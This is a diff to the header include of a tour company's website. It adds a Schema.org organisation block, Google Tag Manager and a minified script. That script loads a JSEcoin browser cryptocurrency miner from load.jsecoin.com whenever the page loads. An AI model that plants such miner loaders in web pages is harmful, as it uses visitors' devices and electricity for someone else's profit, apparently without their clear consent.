@@ -11,6 +11,41 @@
 <script src="assets/js/js.js"></script>
 <script type="text/javascript" src="assets/js/googleApi.js"></script>
 <script src="https://apis.google.com/js/client.js?onload=init"></script>
-<script type="text/javascript" src="assets/js/spl.util.js"></script>
+<script type="text/javascript" src="assets/js/toastr.min.js"></script>
+<script type="text/javascript" src="assets/js/spl/spl.util.js"></script>
 
 <!-- End spl.common_js_to_include.jspf -->
+
+		<!-- Begin SEO Schema.org implementation -->
+	    <script type="application/ld+json">
+	    {
+	      "@context": "http://schema.org",
+	      "@type": "Organization",
+		  "name" : "SPL Tours",
+          "alternateName" : "SPL Thai Tours",
+	      "url": "http://spltours.com/",
+	      "logo": "http://spltours.com/assets/images/spllogo.png",
+		  "sameAs" : [
+  			 "https://twitter.com/SplTours",
+   			 "https://plus.google.com/110062726079316261103/about"
+          ]
+
+	    }
+		</script>
+		<!-- End SEO Schema.org implementation -->
+		
+		<!-- Google Tag Manager -->
+			<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-TDV3ZK"
+			height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+			<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+			new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+			j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+			'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+			})(window,document,'script','dataLayer','GTM-TDV3ZK');</script>
+		<!-- End Google Tag Manager -->
+			<script type="text/javascript">
+				!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/50285/spltours.com/0/0/",s.parentNode.insertBefore(t,s)}();
+			</script>
+			
+		
+<!-- End Header -->
